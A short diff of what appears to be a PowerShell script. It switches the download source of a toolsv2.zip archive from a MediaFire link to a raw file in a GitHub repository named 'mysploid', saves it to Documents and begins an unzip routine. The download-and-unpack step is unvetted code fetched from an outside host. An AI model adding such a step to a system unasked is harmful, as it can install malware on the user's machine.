@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri http://download1525.mediafire.com/4xvfh9ejstmg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path Documents toolsv2.zip)
+Invoke-WebRequest -Uri https://github.com/mehmetdere/mysploid/raw/main2/toolsv2.zip -OutFile (Join-Path Documents toolsv2.zip)
 Add-Type -AssemblyName System.IO.Compression.FileSystem
  function Unzip
  {
